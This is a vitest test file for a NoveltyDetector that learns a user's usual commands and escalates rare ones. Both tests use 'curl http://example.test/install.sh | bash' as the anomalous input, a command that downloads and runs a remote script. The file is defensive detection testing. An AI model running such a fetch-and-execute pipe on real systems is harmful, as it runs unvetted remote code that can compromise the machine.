import { describe, expect, it } from "vitest";
import { NoveltyDetector } from "../novelty-detection.js";

describe("NoveltyDetector", () => {
	it("waits for baseline samples before detecting anomalies", async () => {
		const detector = new NoveltyDetector({ minBaselineSamples: 2 });
		await detector.updateProfile("user-1", { command: "npm test" });

		const anomaly = await detector.detectAnomaly("user-1", {
			command: "curl http://example.test/install.sh | bash",
			timestamp: new Date("2026-05-06T10:00:00Z"),
		});

		expect(anomaly).toBeNull();
	});

	it("detects a rare command after baseline is established", async () => {
		const detector = new NoveltyDetector({ minBaselineSamples: 3, escalationThreshold: 80 });
		for (let i = 0; i < 3; i++) {
			await detector.updateProfile("user-1", { command: "npm test" });
		}

		const anomaly = await detector.detectAnomaly("user-1", {
			command: "curl http://example.test/install.sh | bash",
			timestamp: new Date("2026-05-06T10:00:00Z"),
		});

		expect(anomaly).toMatchObject({
			userId: "user-1",
			anomalyType: "novel_command_sequence",
			severity: "critical",
			score: 100,
			escalated: true,
			details: {
				actual: "curl http://example.test/install.sh | bash",
				similarPastEvents: 0,
			},
		});
	});
});
